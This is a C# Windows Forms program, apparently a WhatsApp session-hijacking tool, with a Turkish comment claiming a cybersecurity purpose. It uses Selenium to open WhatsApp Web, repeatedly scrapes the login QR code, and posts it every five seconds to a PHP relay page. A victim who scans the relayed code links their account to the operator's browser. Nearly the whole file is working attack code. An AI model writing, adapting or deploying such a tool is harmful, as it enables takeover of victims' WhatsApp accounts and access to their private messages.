using OpenQA.Selenium;
using OpenQA.Selenium.Chrome;
using System;
using System.Collections.Specialized;
using System.Drawing;
using System.IO;
using System.Net;
using System.Threading;
using System.Windows.Forms;

//Bu proje Siber Güvenlik amaçlı By Ebubekir Bastama tarafın'dan hazırlanmıştır.
namespace whatshapHack
{
    public partial class Form1 : Form
    {
        public IWebDriver drv;
        public Form1()
        {
            CheckForIllegalCrossThreadCalls = false;
            ChromeDriverService service = ChromeDriverService.CreateDefaultService();
            service.HideCommandPromptWindow = true;
            drv = new ChromeDriver(service);
            InitializeComponent();
        }
        string url = "https://web.whatsapp.com/"; Thread th; string qrcode;
        private void button1_Click(object sender, EventArgs e)
        {
            th = new Thread(pstyll);th.Start();
        }

        private void pstyll()
        {
            postyolla();
        }

        void islemebasla()
        {
            drv.Navigate().GoToUrl(url);qrcodegetirrr();
           
        }
        void postyolla()
        {
            //using (WebClient client = new WebClient())
            //{
            //    // Post işlemini yapmak isteğimiz url bilgisini giriyoruz.
            //    string postUrl = "http://localhost:8080/whatshapphack/index.php";

            //    client.UploadValues(postUrl, new NameValueCollection()
            //     {
            //         { "qrcode", qrcode },                    

            //     });

            //}
            while (true)
            {
                Thread.Sleep(5000);
                using (WebClient client = new WebClient())
                {
                    // Post işlemini yapmak isteğimiz url bilgisini giriyoruz.
                    string postUrl = "http://localhost:8080/whatshapphack/index.php";

                    client.UploadValues(postUrl, new NameValueCollection()
                 {
                     { "qrcode", qrcode }

                 });

                }
            }

        }
        void qrcodegetirrr()
        {
            try
            {
                while (true)
                {
                   qrcode= drv.FindElement(By.XPath("//img[@alt='Scan me!']")).GetAttribute("src");
                    string frmbase64 = qrcode;
                    pictureBox1.Image = Base64ToImage(frmbase64.Substring(22));
                }

            }
            catch
            {

            }
        }
        Image Base64ToImage(string base64String)
        {
            byte[] imageBytes = Convert.FromBase64String(base64String);
            using (var ms = new MemoryStream(imageBytes, 0, imageBytes.Length))
            {
                Image image = Image.FromStream(ms, true);
                return image;
            }
        }

        private void Form1_FormClosed(object sender, FormClosedEventArgs e)
        {
            drv.Quit();
            th.Abort();
        }

        private void Form1_Load(object sender, EventArgs e)
        {
            th = new Thread(islemebasla); th.Start();
        }

        private void pictureBox1_Click(object sender, EventArgs e)
        {
            th = new Thread(islemebasla); th.Start();
        }
    }
}
